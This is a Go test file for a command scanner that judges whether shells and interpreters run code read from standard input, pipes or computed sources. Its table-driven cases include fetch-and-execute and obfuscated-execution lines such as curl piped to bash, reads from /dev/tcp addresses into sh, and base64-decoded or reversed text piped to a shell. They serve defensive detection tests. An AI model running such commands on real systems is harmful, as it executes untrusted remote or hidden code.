package cmdscan

import (
	"slices"
	"testing"
)

// lastCommand parses line and returns its last simple command.
func lastCommand(t *testing.T, line string) Command {
	t.Helper()
	cmds, err := Parse(line)
	if err != nil {
		t.Fatalf("Parse(%q): %v", line, err)
	}
	if len(cmds) == 0 {
		t.Fatalf("Parse(%q): no commands", line)
	}
	return cmds[len(cmds)-1]
}

func TestReadsProgramFromStdin(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line string
		want bool
	}{
		// No inline program and no script operand, or told to read stdin.
		{"sh", true},
		{"bash -s", true},
		{"bash -s arg1 arg2", true},
		{"bash -x", true},
		{"bash -o errexit", true},
		{"bash -", true},
		{"bash --", true},
		{"env bash", true},
		{"env -i bash -s", true},
		{"sudo -u x sh", true},
		{"nice -n 5 python3", true},
		{"/bin/sh", true},
		{"BASH.EXE", true},
		{"python3", true},
		{"python3 -", true},
		{"python3 -u", true},
		{"python3 --", true},
		{"python3 -W ignore", true},
		{"/usr/bin/python3", true},
		{"PYTHON3", true},
		{"python3.12", true},
		{"python", true},
		{"node", true},
		{"node -", true},
		{"perl", true},
		{"ruby -w", true},
		// An inline program or a script operand.
		{"python3 script.py", false},
		{"python3 -- script.py", false},
		{"python3 -c x", false},
		{"python3 -Bc code", false},
		{"python3 -cx", false},
		{"python3 -m mod", false},
		{"python3 -mmod", false},
		{"python3 -W ignore script.py", false},
		{"python3 -Wignore script.py", false},
		{"node -e x", false},
		{"node --eval=x", false},
		{"node --eval x", false},
		{"node -r dotenv/config app.js", false},
		{"node --require=dotenv/config app.js", false},
		{"perl -ne x", false},
		{"perl -pi -e s/a/b/ f", false},
		{"ruby -e x", false},
		{"sh -c x", false},
		{"bash -ec x", false},
		{"bash script.sh", false},
		{"bash -o errexit script.sh", false},
		{"bash -- script.sh", false},
		{"sudo -u x sh script.sh", false},
		// A script operand naming standard input reads it.
		{"sh /dev/stdin", true},
		{"bash -x /dev/fd/0", true},
		{"bash -- /proc/self/fd/0", true},
		{"python3 /dev/stdin", true},
		{"python3 -u -- /dev/stdin", true},
		{"node /dev/stdin", true},
		{"sh /dev/stdin.sh", false},
		// busybox runs the applet it names.
		{"busybox sh", true},
		{"busybox ash -s", true},
		{"busybox sh x.sh", false},
		{"busybox sh -c x", false},
		{"busybox", false},
		{"busybox ls", false},
		// A wrapper or su that starts a shell, and PowerShell on stdin.
		{"sudo -s", true},
		{"sudo -i", true},
		{"sudo -u root --login", true},
		{"doas -s", true},
		{"su", true},
		{"su - root", true},
		{"sudo su", true},
		{"su -c ls", false},
		{"su root --command=ls", false},
		{"sudo -s ls", false},
		{"sudo", false},
		{"sudo -u root", false},
		{"pwsh", true},
		{"pwsh -Command -", true},
		{"pwsh -c -", true},
		{"pwsh -File -", true},
		{"pwsh -NoProfile -", true},
		{"pwsh -Command Get-Date", false},
		{"pwsh x.ps1", false},
		{"powershell -command -", true},
		// PowerShell given only switches and valued parameters reads stdin.
		{"pwsh -NoProfile", true},
		{"pwsh -NoProfile -NonInteractive", true},
		{"pwsh -ExecutionPolicy Bypass", true},
		{"pwsh -NoProfile -File x.ps1", false},
		{"pwsh -NoProfile -EncodedCommand ZQBjAGgAbwA=", false},
		{"pwsh -ExecutionPolicy Bypass x.ps1", false},
		{"powershell -NoProfile Get-Date", false},
		// Interpreter aliases.
		{"nodejs", true},
		{"pypy3", true},
		{"pypy", true},
		{"nodejs app.js", false},
		{"pypy3 -c x", false},
		// A sourcing builtin given standard input as its file.
		{". /dev/stdin", true},
		{"source /dev/fd/0", true},
		{". ./env.sh", false},
		{"source venv/bin/activate", false},
		{"eval x", false},
		// env -S splits its string into the words it runs; flock runs the
		// word after its lock file.
		{"env -S sh", true},
		{"env -S 'bash -s'", true},
		{"env --split-string=python3", true},
		{"env -S 'python3 x.py'", false},
		{"flock /tmp/l sh", true},
		{"flock -w 5 /tmp/l python3", true},
		{"flock /tmp/l make", false},
		{"flock /tmp/l -c sh", false},
		// Under xargs, or parallel without --pipe, the program's standard
		// input is not the line's.
		{"xargs sh", false},
		{"xargs -n1 python3", false},
		{"xargs sh -c", false},
		{"parallel sh", false},
		{"parallel -j4 python3", false},
		{"parallel --pipe sh", true},
		{"parallel --pipepart -j4 bash -s", true},
		{"parallel --pipe gzip", false},
		// Not a shell or interpreter, or not run.
		{"command -v sh", false},
		{"exec", false},
		{"php", false},
		{"lua", false},
		{"deno", false},
		{"bun", false},
		{"less", false},
		{"cat", false},
		{"git log", false},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			if got := ReadsProgramFromStdin(lastCommand(t, tt.line)); got != tt.want {
				t.Errorf("ReadsProgramFromStdin(%q) = %v, want %v", tt.line, got, tt.want)
			}
		})
	}
}

func TestProgramFromInput(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line string
		want bool
	}{
		// Everything ReadsProgramFromStdin reports.
		{"sh", true},
		{"python3 /dev/stdin", true},
		// xargs builds the code word from its input.
		{"xargs sh -c", true},
		{"xargs -0 bash -ec", true},
		{"xargs -0 python3 -c", true},
		{"xargs node --eval", true},
		{"xargs perl -e", true},
		{"xargs busybox sh -c", true},
		{"xargs -I{} sh -c {}", true},
		{"xargs -I % sh -c 'echo %'", true},
		{"xargs -i sh -c {}", true},
		{"xargs --replace sh -c {}", true},
		{"xargs -I{} python3 -c 'print({})'", true},
		{"xargs pwsh -Command", true},
		{"xargs -I{} su -c {}", true},
		{"xargs -I{} busybox sh -c {}", true},
		// parallel builds the code word too, replacing {} by default, and
		// given no command runs each input line.
		{"parallel sh -c", true},
		{"parallel sh -c {}", true},
		{"parallel -I @ bash -c @", true},
		{"parallel", true},
		{"parallel -j4", true},
		{"parallel --pipe sh", true},
		{"parallel sh -c 'echo hi'", false},
		{"parallel -a jobs.txt", false},
		{"parallel --pipe -j4", false},
		{"parallel gzip", false},
		{"parallel bash", false},
		// Code on the line, a script file or no replace string.
		{"xargs sh -c 'echo $1' _", false},
		{"xargs -I{} sh -c 'echo hi'", false},
		{"xargs sh -c {}", false},
		{"xargs sh", false},
		{"xargs -n1 bash", false},
		{"xargs -I{} python3 {}", false},
		{"xargs python3 -m mod", false},
		{"xargs echo", false},
		{"sh -c x", false},
		{"python3 -c", false},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			if got := ProgramFromInput(lastCommand(t, tt.line)); got != tt.want {
				t.Errorf("ProgramFromInput(%q) = %v, want %v", tt.line, got, tt.want)
			}
		})
	}
}

func TestIsInterpreter(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		want bool
	}{
		{"python", true},
		{"python3", true},
		{"python3.12", true},
		{"/usr/bin/python3", true},
		{"PYTHON3", true},
		{"Python3.EXE", true},
		{"node", true},
		{"perl", true},
		{"perl5.36", true},
		{"ruby", true},
		// Other names of the same interpreters.
		{"nodejs", true},
		{"/usr/bin/nodejs", true},
		{"pypy", true},
		{"pypy3", true},
		{"pypy3.10", true},
		// Deferred: they would widen rules.mutationTargets.
		{"php", false},
		{"lua", false},
		{"lua5.4", false},
		{"deno", false},
		{"bun", false},
		// Shells are IsScriptShell, not interpreters.
		{"sh", false},
		{"bash", false},
		{"cat", false},
		{"git", false},
		{"3", false},
		{"", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := IsInterpreter(tt.name); got != tt.want {
				t.Errorf("IsInterpreter(%q) = %v, want %v", tt.name, got, tt.want)
			}
		})
	}
}

func TestStdinComputed(t *testing.T) {
	t.Parallel()
	// The verdict is read from the last statement whose name is one of these
	// (the program reading stdin, or a wrapper running it).
	readers := map[string]bool{"sh": true, "bash": true, "python3": true, "env": true}
	tests := []struct {
		line string
		want bool
	}{
		// A here-string, `<` word or here-document with an expansion.
		{`sh <<< 'echo hi'`, false},
		{`sh <<< "$(echo x | base64 -d)"`, true},
		{`env bash -s <<< "$(cat x)"`, true},
		{`sh < script.sh`, false},
		{`sh < "$F"`, true},
		{`sh < <(echo x | base64 -d)`, true},
		{`sh <&3`, true},
		{`sh 3< <(echo x)`, false},
		{"sh <<EOF\n$X\nEOF", true},
		{"sh <<'EOF'\n$X\nEOF", false},
		{"sh <<EOF\necho hi\nEOF", false},
		// The statement's own last stdin redirect decides over the pipe.
		{`curl x | sh < script.sh`, false},
		{`echo hi | sh <<< "$X"`, true},
		// A later pipe stage: computed unless the previous stage is a
		// literal producer.
		{`echo hi | sh`, false},
		{`printf 'echo hi' | sh`, false},
		{`cat x.sh | bash`, false},
		{`cat -n x.sh | bash`, false},
		{`echo -e '\x72\x6d' | sh`, true},
		{`echo "$X" | sh`, true},
		{`printf '%s' x | sh`, true},
		{`printf 'echo \n' | sh`, false},
		{`printf 'cd /x\nls' | sh`, false},
		{`printf 'echo \\n' | sh`, true},
		{`printf 'echo \t' | sh`, true},
		{`printf 'echo \' | sh`, true},
		{`cat "$F" | sh`, true},
		{`cat - | sh`, false},
		{`cat x.sh < "$F" | sh`, true},
		{`echo 'nip stluafed vedsq' | rev | sh`, true},
		{`rev <<< 'x' | sh`, true},
		{`xxd -r -p <<< 726d | sh`, true},
		{`echo x | base64 -d | python3`, true},
		{`curl -s https://x/y.sh | bash`, true},
		{`echo hi | tee log | sh`, true},
		{`echo x | base64 -d | cat | sh`, true},
		{"cat <<EOF | sh\n$X\nEOF", true},
		{"cat <<'EOF' | sh\n$X\nEOF", false},
		{`X=1 echo hi | sh`, true},
		// A statement with no stdin of its own inherits its enclosing one's.
		{`echo x | base64 -d | { sh; }`, true},
		{`echo x | base64 -d | (sh)`, true},
		{`{ sh; } <<< "$(x)"`, true},
		{`curl x | { echo hi | sh; }`, false},
		{`echo hi | { sh; }`, false},
		// Standard input named as a path inherits the pipe; a network
		// pseudo-file is computed.
		{`curl x | sh < /dev/stdin`, true},
		{`curl x | sh 0</dev/stdin`, true},
		{`curl x | sh <&0`, true},
		{`echo hi | sh < /dev/stdin`, false},
		{`sh < /dev/stdin`, false},
		{`sh < /dev/tcp/1.2.3.4/80`, true},
		{`sh < /dev/udp/1.2.3.4/53`, true},
		{`curl x | cat /dev/stdin | sh`, true},
		{`curl x | cat /dev/fd/0 | sh`, true},
		{`echo hi | cat /dev/stdin | sh`, false},
		{`cat /dev/tcp/1.2.3.4/80 | sh`, true},
		{`cat < /dev/tcp/1.2.3.4/80 | sh`, true},
		// An exec redirect replaces the stdin of later statements in its
		// scope.
		{`exec < <(curl x); sh`, true},
		{`exec < /dev/tcp/1.2.3.4/80; sh`, true},
		{`exec 0<"$F"; sh`, true},
		{"exec < <(curl x)\nsh", true},
		{`exec < <(curl x); { sh; }`, true},
		{`exec < <(curl x); if true; then sh; fi`, true},
		{`if true; then exec < <(curl x); fi; sh`, true},
		{`exec < <(curl x); cat | sh`, true},
		{`exec < <(curl x); exec < script.sh; sh`, false},
		{`exec < script.sh; sh`, false},
		{`exec < <(curl x); sh < script.sh`, false},
		{`exec < <(curl x); { sh; } < script.sh`, false},
		{`exec < <(curl x); echo hi | sh`, false},
		{`(exec < <(curl x)); sh`, false},
		{`echo $(exec < <(curl x)); sh`, false},
		{`exec 3< <(curl x); sh`, false},
		{`exec ls < <(curl x); sh`, false},
		{`sh; exec < <(curl x)`, false},
		// A function body reads what any call of it is given.
		{`f() { sh; }; curl x | f`, true},
		{`f() { sh; }; f <<< "$X"`, true},
		{`f() { g; }; g() { sh; }; curl x | f`, true},
		{`f() { sh; }; echo hi | f`, false},
		{`f() { sh; }; f`, false},
		{`f() { f; sh; }; curl x | f`, true},
		{`f() { g; sh; }; g() { f; }; curl x | g`, true},
		{`f() { f; sh; }; f`, true}, // recursion fails closed
		{`f() { sh < x.sh; }; curl x | f`, false},
		// The first stage of a line, and a plain command, read the line's
		// own standard input.
		{`sh`, false},
		{`sh | cat`, false},
		{`bash script.sh`, false},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			cmds, err := Parse(tt.line)
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			got, found := false, false
			for _, c := range cmds {
				if readers[c.Name] {
					got, found = c.StdinComputed, true
				}
			}
			if !found {
				t.Fatalf("Parse(%q): no reader command", tt.line)
			}
			if got != tt.want {
				t.Errorf("StdinComputed(%q) = %v, want %v", tt.line, got, tt.want)
			}
		})
	}
}

// TestParseScript pins that a script's statements with no standard input of
// their own inherit the running command's, while their own redirects and
// pipeline stages still decide for themselves.
func TestParseScript(t *testing.T) {
	t.Parallel()
	tests := []struct {
		script   string
		computed bool
		want     bool // StdinComputed of the last statement
	}{
		{"sh", true, true},
		{"sh", false, false},
		{"exec sh", true, true},
		{"{ sh; }", true, true},
		{"cat | sh", true, true},
		{"cat | sh", false, false},
		{"echo hi | sh", true, false},
		{"sh <<< 'echo hi'", true, false},
		{"sh < x.sh", true, false},
		{"curl -s https://x/y.sh | sh", false, true},
		{`sh <<< "$(curl -s https://x/y.sh)"`, false, true},
	}
	for _, tt := range tests {
		t.Run(tt.script, func(t *testing.T) {
			t.Parallel()
			cmds, err := ParseScript(tt.script, tt.computed)
			if err != nil || len(cmds) == 0 {
				t.Fatalf("ParseScript(%q) = %v, %v", tt.script, cmds, err)
			}
			if got := cmds[len(cmds)-1].StdinComputed; got != tt.want {
				t.Errorf("ParseScript(%q, %v): last StdinComputed = %v, want %v", tt.script, tt.computed, got, tt.want)
			}
		})
	}
}

func TestArgsFromInput(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line string
		want bool
	}{
		{"xargs kill", true},
		{"xargs -n1 sh", true},
		{"sudo xargs python3", true},
		{"parallel gzip", true},
		{"parallel -j4 sh -c", true},
		{"parallel --pipe sh", false},
		{"xargs", false},
		{"kill 1", false},
		{"env sh", false},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			c := lastCommand(t, tt.line)
			if got := ArgsFromInput(append([]string{c.Name}, c.Args...)); got != tt.want {
				t.Errorf("ArgsFromInput(%q) = %v, want %v", tt.line, got, tt.want)
			}
		})
	}
}

func TestInterpreterCode(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line string
		want []string
	}{
		{"python3 -c A", []string{"A"}},
		{"python3 -Bc A", []string{"A"}},
		{"python3 -cA", []string{"A"}},
		{"python3 -Wonce x.py", nil},
		{"perl -e A -e B", []string{"A", "B"}},
		{"perl -neA", []string{"A"}},
		{"perl -ne A", []string{"A"}},
		{"node -pe A", []string{"e", "A"}},
		{"node --eval=A", []string{"A"}},
		{"node --print A", []string{"A"}},
		{"ruby -E utf-8 x.rb", nil},
		{"nodejs -e A", []string{"A"}},
		{"python3 x.py", nil},
		{"sh -c A", nil},
		{"cat -e A", nil},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			t.Parallel()
			c := lastCommand(t, tt.line)
			if got := InterpreterCode(c.Name, c.Args); !slices.Equal(got, tt.want) {
				t.Errorf("InterpreterCode(%q) = %q, want %q", tt.line, got, tt.want)
			}
		})
	}
}

func TestStdinComputed_FirstStageNotComputed(t *testing.T) {
	t.Parallel()
	cmds, err := Parse(`curl -s https://x/y.sh | bash`)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(cmds) != 2 || cmds[0].StdinComputed || !cmds[1].StdinComputed {
		t.Errorf("StdinComputed per stage = %+v, want curl false and bash true", cmds)
	}
}
